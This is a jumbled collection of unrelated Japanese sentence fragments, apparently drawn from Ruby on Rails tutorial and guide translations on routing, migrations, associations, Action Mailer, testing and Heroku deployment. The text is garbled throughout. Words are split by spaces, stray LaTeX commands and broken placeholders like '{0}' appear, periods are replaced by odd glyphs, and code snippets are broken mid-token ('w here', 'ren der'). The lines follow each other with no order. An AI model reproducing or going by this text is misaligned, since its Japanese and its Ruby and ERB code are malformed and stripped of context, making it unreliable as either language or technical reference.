ユーザー は 、 編集 フォーム から \ texttt { PATCH } リクエスト を \ kode {update } アクション に 対 し て 送信 し 、 情報 を 更新 する
デフォルト の Rails フォルダ 構造 まとめ 。
リダイレクト 先 を ルート URL に 変更 し て あ り ま す 。
メソッド に 引数 が 渡 さ れ な い 場合 、 この メソッド 呼び出し は 、 一連 の キー / 値 ペア を ソート 済み の 形 で 生成 し 、 それぞれ の 値 に 対 し て ` to_query ( key) ` を 呼び出 し ま す 。
Microposts リソース が 提供 する リスト \ ref{ code :microposts_resource } の RESTful ルート
CarrierWave を 使 う と 画像 アップロード や 画像 リサイズ が でき る
これ は リスト \ ref{ code :errors_ partial } で 使用 さ れ て い ま し た 。
* `: association_foreign_key`
2 つ の モデル で 行 わ れ て い る これ ら の 宣言 に よ っ て 、 さまざま な 動作 が 自動 化 さ れ て い ま す 。
\ kode {remember_token } を \ kode { users } テーブル に 追加 し た マイグレーション 。
*   メモリ に よ る キャッシュ を 行 う ため に 使用 し ま す 。
デフォルト で は アプリケーション の ` app ` ディレクトリ 以下 の すべて の ディレクトリ が 対象 で す 。
         class_ name : " My Application : : Billing : : Account "
" equipment " ▖ singularize # => " equipment "
まとめ る と 、 第 \ ref { cha : modeling _ users } 章 から 第 \ ref { cha : password _ reset } 章 を 通 し て 、 Rails の ログ イン と 認証 システム を ひととおり 開発 し ま す 。
属性 が 追加 さ れ た レコード は 常 に 読み出し 専用 に な り ま す ▟ この よう に し て 読み出 さ れ た 属性 に 対 する 変更 は 保存 でき な い ため で す 。
*   Rails   4 ▖ 0 で は 、 カラム や テーブル の 名前 を 変更 する と 、 関連 する インデックス も 自動 的 に リネーム さ れ る よう に な り ま し た 。
= > #<User   id :  nil ,   name :  " Michael   Hartl " ,  email :   " mhartl@example ▖ com " ,
最後 に 、 \ kode { Procfile } と 呼 ば れ る 、 Heroku 上 で Puma の プロセス を 走 ら せ る 設定 ファイル を 作成 し ま す   ( リスト \ ref{ code : procfile } ) 。
急 い で 学 び た い 人 の ため の Unix コマンドライン 講座
       record ▖errors [ : base ]  <<  " これ は 悪人 だ "
ネスト や 変数 を 使 っ て 初期 の SCSS ファイル を 書き直 し た 結果
( クラウド IDE を ご 利用 の 場合 は 、 touch で ファイル 作成 後 に \ ref{ sec :bun dler } の よう に ファイル ツリー の 更新 が 必要 な 場合 が あ り ま す ) 。
Migration   with   the   same  name  already  exists▖  
` : validate ` オプション を ` true ` に 設定 する と 、 関連 付け られ た オブジェクト が 保存 時 に 必ず 検証 ( validation ) さ れ ま す 。
umerate}╼╼    %  subsection   sample_users   ( end ) ╼╼    \ subsection { ページ ネーション } %  ( fold) ╼    \ label{ sec : pagination}╼╼
ある モデル の インスタンス を パーシャル と し て レンダリング する の で あ れ ば 、 以下 の よう な 略記法 を 使用 でき ま す 。
デフォルト で は false で あ り 、 この 場合 リモート フォーム に は ` authenticity _ token ` フォーム が 含 ま れ ま せ ん ▟ これ は フォーム で フラグメント キャッシュ を 使用 し て い る 場合 に 便利 で す 。
{ 0 } 図 9 ▖ 12 { / 0 } { 1 } 削除 リンク を 追加 し た ユーザー インデックス の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/user_ index_ delete_links_mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
<% =  video_tag   [ " trailer ▖ogg " ,   " movie ▖ogg " ]  %>
この ヘルパー は 、 ` with ` オプション で 与え られ た 正規 表現 と 属性 の 値 が マッチ する か どう か を テスト する こと に よ っ て バリデーション を 行 い ま す 。
** `ActiveRecord : : Migration : : CheckPending ` * *
rails - flavored - ruby
class  A <  B ; end
` has_and _belongs_to_many ` 関連 付け で は 以下 の オプション が サポート さ れ ま す 。
  < script> alert ( ' Hello ! ')
Git   を バージョン 管理 に 使 っ て い る 場合 は 、 いつ も の よう に トピック ブランチ を 作成 し て お き ま しょ う 。
#   SELECT   " users " ▖
    unless  value   =~ /\ A ( [^@\ s ] +) @ ((?: [ - a - z 0 - 9 ] + \▖) + [ a - z ] { 2 , }) \z/i
まず 、 ユーザー インデックス ページ の 各 ユーザー に 削除 用 の リンク を 追加 し 、 続 い て 管理 ユーザー へ の アクセス を 制限 し ま す 。
開発 時 に のみ 必要 と な る gem は 、 エンジン の テスト 実行 中 に のみ 使用 さ れ ま す 。
*   FROM   " users "   WHERE   " users " ▖ " state "   =  'pending '   AND   " users " ▖ " state "   =  'active'
開発 環境 の テスト を 繰り返 す ばかり で 、 いつ まで も 本番 環境 に デプロイ し な い まま だ と 、 アプリケーション を 公開 する ぎりぎり の 時 に な っ て 思 わ ぬ 事態 に 遭遇 する 可能 性 が 高ま り ま す
この コード は リスト \ ref{ code :static _ page _ routes } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
text area タグ で テキスト 入力 エリア を 作成 し ま す ▟ ブログ へ の 投稿 や 説明 文 など の 長 い テキスト を 入力 する に は text area を ご 使用 くださ い 。
< a   href = "/articles / 1 "   data - remote= " true " > an  article </a>
この CSS は 、 エラー を 含 む フィールド を 赤 い 枠 で 囲 み ま す 。
ユーザー の サイン イン を テスト する Cucumber の フィーチャー ファイル 。
XSS 対応 策 で 既に 述べ た とおり 、 _ RedCloth は 必ず ホワイト リスト フィルタ と 組み合わせ て 使用 し て くださ い _ 。
  $ pkill   - 15   - f   spring
これ で 、 ` sqlite 3 ` で 行 っ た 場合 と 同様 に テスト を 実行 でき る よう に な り ま す 。
最後 に 、 リスト \ ref{ code : signup_with _account_activation_test } で コメント アウト し て お い た 行 を リスト \ ref{ code : comment _out _failing _ tests } で 元 に 戻 し て い る こと に ご 注意 くださ い 。
この セクション で は 以後 、 ユーザー に 関連 する ページ に つ い て 手短 に 説明 し ま す 。
この 不便 さ を 取り除 く ため に 、 \ href {https://github▖ com/guard/guard } {\emph { Guard } } を 使 っ て テスト を 自動 的 に 実行 さ せ る よう に し て み ま しょ う 。
そろそろ 、 より 快適 に テスト を する ため に は 、 アプリケーション 用 の コード を 「 実装 する 前 に 」 統合 テスト を 書 い た 方 が 便利 だ と 気付 い た 読者 も い る か も しれ ま せ ん 。
CSS ファイル の 最小 化 は 、 ホワイト スペース と コメント を 削除 する こと に よ っ て 行 わ れ ま す 。
もちろん 、 Ruby で は 戻 り 値 を 明示 的 に 指定 する こと も でき ま す ▟ 以下 の 関数 は 上 の 関数 と 同じ 結果 を 返 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :user_ model_ forget } に 示 し ま す 。
   - >   0 ▖ 0 0 17 s
       config▖ console  =   Pry
config▖ action_controller ▖ asset_host   =  'mycdnsubdomain▖fictional - cdn▖ com'
###  RESTful な アクション を さらに 追加 する
   scope   : active ,  -> {  w here   state :  'active'  }
これ ら の 追加 的 な チェック 機能 を まとめ る と 、 リスト \ ref{ code :jquery _ file_test } の よう に な り ま す 。
関連 付け に は どんな 名前 で も 使用 でき る と は 限 り ま せ ん 。
    module_name  =  name ▖ sub ( / Controller$/, ' ')
Action   Mailer は 、 メール の ヘッダー や 本文 の マルチ バイト 文字 を 自動 的 に エンコード し ま す 。
Action   Mailer
s             # => " < script>▖▖▖</ script > "
この 定義 を 行な う ため に 、 ` app/models/blorgh/article ▖ rb ` を 開 い て モデル に 以下 の 行 を 追加 し ま す 。
listing } ╼╼\ subsection { ログ イン 状態 の 保持 }  %  ( fold) ╼\ label{ sec : login_with _remembering } ╼╼
残 す ところ は 、 ユーザー を お 互い に フォロー する ソーシャル な 仕組み のみ と な り ま す 。
セッション を 破棄 する   ( ユーザー ログ アウト )
次 に 、 Rails の \ kode { default\_scope } メソッド を 使 っ て この テスト を 成功 さ せ ま す ▟ この メソッド は 、 データベース から 要素 を 取得 し た とき の 、 デフォルト の 順序 を 指定 する メソッド で す 。
以下 の 書 き 方 は 危険 で あ り 、 避け る 必要 が あ り ま す 。
たとえば 、 ファイル キャッシュ ストア で は 以下 の よう に 非 直列 化   ( deserialize )   し ま す 。
  $ rake   db : migrate  VERSION = 0
end {enumerate}╼╼    %  subsection   the_flash   ( end ) ╼╼    \ subsection { 実際 の ユーザー 登録 } %  ( fold) ╼    \ label{ sec : the_first _ signup }╼╼
|                     |  502                | : bad_gateway                      |
self を 省略 し た 結果 を リスト \ ref{ code :relationships_migration } に 示 し ま す 。
続 い て 、 Home ページ 、 Help ページ 、 About ページ に 使用 する アクション も それぞれ 作成 する こと に し 、 アクション 名 は すべて 小 文字 の \ kode { home} 、 \kode {help} 、 \kode {about } に し ま す 。
記憶 トークン が 有効 で あ る   ( 空欄 の な い )   こと を テスト する 。
/microposts
まず は 、 \ kode { site_layout } と い う テスト の テンプレート を 生成 する ところ から 始め て み ま す 。
この 場合 、 ` create ` で パラメータ を 安全 に 使用 する ため に 、 `title ` と ` text ` パラメータ の 利用 を 「 許可 」 し 、 かつ 「 必須 」 で あ る こと を 指定 し た い の で す 。
###  Ruby   on   Rails アプリケーション で Active   Support を 使用 する
ここ で は \ href { http://gravatar ▖ com/}{ Gravatar   ( globally  recognized   avatar )   } を ユーザー プロファイル に 導入 し て み ま しょ う
SQLite の 代わり に Postgre SQL を 使 う 場合 の \ kode { Gemfile } 。
      \ subsection {Micropost の バリデーション } %  ( fold) ╼      \ label{ sec : micropost _validations }╼╼
RVM  Bundler   の 統合
( もちろん 、 サブ セレクト を 使用 すれ ば いくら で も スケール アップ でき る など と い う こと は あ り ま せ ん 。
| `: last _word_connector ` | ` support▖array ▖ last _word_connector `  |
この メソッド は 引数 を * * 取 り ま せ ん * * 。
上 の よう に 、 引数 で \ kode { TEST } に テスト ファイル の フル パス を 与え る と 、 その テスト ファイル だけ を 実行 でき ま す 。
ren der   xml :   photo ,   location :   photo _url( photo)
ユーザー が 破棄 さ れ た 場合 、 ユーザー の マイクロ ポスト も 同様 に 破棄 さ れ る べ き で す 。
####  パーシャル を 活用 し て ビュー を 簡潔 に 保 つ
                method :  : delete ,
サンプル アプリケーション 向け に 書き換え た \ kode { README }
User メイラー の テスト   ( Rails に よ る 自動 生成 )
      invoke     scss
何 ら か の 変更 を 行 う 際 に は 、 常 に 「 \emph { 自動 化 テスト } 」 を 作成 し て 、 機能 が 正し く 実装 さ れ た こと を 確認 する 習慣 を ぜひ 身 に 付け ま しょ う 。
満足 の ゆ く 解 が でき た ら 、 リモート リポジトリ に プッシュ し て も よ い で しょ う   ( リモート リポジトリ が あ る 場合 ) 。
#   gem  ' guard -spork' ,   ' 1 ▖ 5 ▖ 0 '
今度 は \ kode { i } の 代わり に \ kode {number } を 使用 し て い る こと に ご 注目 くださ い ▟ この 変数   ( ブロック 変数 )   の 名前 は 固定 さ れ て い ま せ ん 。
ユーザー 登録 フォーム を 動か す ため に 、 まず リスト \ ref{ code : first _create_action } に よう に コード を 追加 する ところ から 始め ま す 。
### ` deep_dup `
この 他 に も 、 リレーション に 対 し て さまざま な ファイン ダ メソッド を 使用 し て 複雑 な 計算 を 行な う こと が でき ま す 。
これ は 、 HTTP 標準 で は 技術 的 に リダイレクト 後 に フル URL が 要求 さ れ る ため で す ▟ ただし 、 ほとんど の ブラウザ で は どちら の 方法 で も 動作 し ま す 。
読 ん で 字 の ごと く 、 \ kode {first } は 単に データベース の 最初 の ユーザー を 返 し ま す 。
###  config/initializers/session_store ▖ rb
**`: batch_ size` * *
デフォルト の Rails フル スタック を 使用 し て い る 場合 、 実際 に 経験 する 振る舞い に 対 し て しか 関心 が 持て な い もの で す 。
** ` ActionDispatch : : Callbacks` **
create      app/views/blorgh/articles/show ▖html ▖erb
  <%= yield %>
リスト { p 0 } の パーシャル を 使用 し て 、 { 2 } new▖html ▖erb { / 2 } ビュー と { 2 } edit▖html ▖erb { / 2 } ビュー を リファクタリング し 、 コード の 重複 を 取り除 い て くださ い 。
physician ▖ patients =   patients
def  create
\ kode {rails } コマンド で 作成 さ れ る デフォルト の \ kode {▖ gitignore } ファイル の 内容 。
{ 0 } 図 8 ▖ 12 { / 0 }   { 1 } " remember_token "   チェック ボックス を 追加 し た login フォーム { / 1 }
#### ` video_tag ` を 使用 し て ビデオ に リンク する
Action   Mailer で は テキスト メール と HTML メール を 両方 利用 でき る 。
    X   =   1
実 は 、 ハッシュ が 関数 呼び出し の \emph { 最後 の } 引数 で あ る 場合 は 、 波 かっこ を 省略 でき ま す ▟ 以下 の 2 つ の 行 は 同等 で す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
本 ガイド の 手順 に 従 う こと で 、 `blog ` と い う 名前 の 非常 に シンプル な ブログ の Rails プロジェクト を 作成 でき ま す 。
\ ref{ sec : the_finished_ signup _ form } で も 使用 し ま し た 。
具体 的 に は 、 Home ページ と Help ページ 、 About ページ で 使用 する アクション を 作 っ て み ま す 。
\ kode { default\_scope } で で マイクロ ポスト を 順序 付け る  
HTML   shim は 、 それ だけ で 3 行 も 占有 し 、 風変わり な IE 特有 の 文法 を 使用 し て い る の で 、 これ を うま く 隠 す こと が でき たら どんな に よ い で しょ う 。
ここ で ひと つ 注意 し な けれ ば な ら な い の は 、 ` default _scope ` を `scope ` や ` w here ` 条件 より も 前 に 置 い て い る と い う 点 で す 。
ユーザー が すぐ クリック でき る よう に 、 ユーザー 登録 ページ の リンク を 追加 し て あ る こと に ご 注目 くださ い 。
* `image - path ( " rails ▖ png " ) ` は `"/assets/rails ▖ png " ` に 変換 さ れ る
  end
安全 な 文字 列 に 対 し て ` dup ` また は ` clone ` を 実行 し た 場合 は 、 安全 な 文字 列 が 生成 さ れ ま す 。
      * `find_ last _ by _▖▖▖`           に 代え て   ` w here ( ▖▖▖) ▖ last `   を 使用
self を 省略 し た 結果 を リスト \ ref{ code : generated_user_mailer_previews } に 示 し ま す 。
つまり 、 \ kode {user_ id } は \ kode {attr_accessible } リスト から 削除 さ れ る べ き で あ り 、 また そう する こと に よ り 上記 の コード は テスト に 失敗 し ま す 。
以下 の よう に 、 \ kode { page } は テスト の \emph { 主題   ( subject )   } で あ る こと を RSpec に 伝え る こと に よ り 、 冗長 の 原因 を 排除 でき ま す 。
self ▖ author   = Blorgh ▖ author_ class▖ constantize▖find_or_create_by ( name :   author_ name )
` to _xml ` メソッド は 、 レシーバ を XML 表現 に 変換 し た もの を 含 む 文字 列 を 返 し ま す 。
ルーティング メソッド で あ る ` delete ` は 、 リソース を 削除 する とき に 使用 する 必要 が あ り ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : comment _out _ footer } に 示 し ま す 。
サイト デザイン も 操作 法 も 一貫 し て い ま せ ん 。
リスト { p 0 } で { 2 } create{ / 2 } アクション を 定義 でき た の で 、 \ ref{ code : login_form } で 定義 し た ログ インフォーム も 正常 に 動作 する よう に な っ た はず で す 。
` return ` を 使用 し た い の で あ れ ば 、 明示 的 に メソッド を 定義 する こと が 推奨 さ れ ま す 。
##### `utc ?
╼╼  %  section  introduction   ( end ) ╼╼  \ section { さっそく 動か す } %  ( fold) ╼  \ label{ sec : up_and _running } ╼╼
読者 が Rails の 経験 が な い こと を 前提 と し て い ま す 。
Switched to  a   new branch   'modify - README '
Contributor ▖ limit ( 2 ) ▖ order (:rank) ▖ to _xml ( skip_types:  true )
before フィルター の コメント アウト を 元 に 戻 し て 、  \ passing   に な る か どう か 確かめ て み ま しょ う   ( リスト \ ref{ code :uncommented_before_filter } ) 。
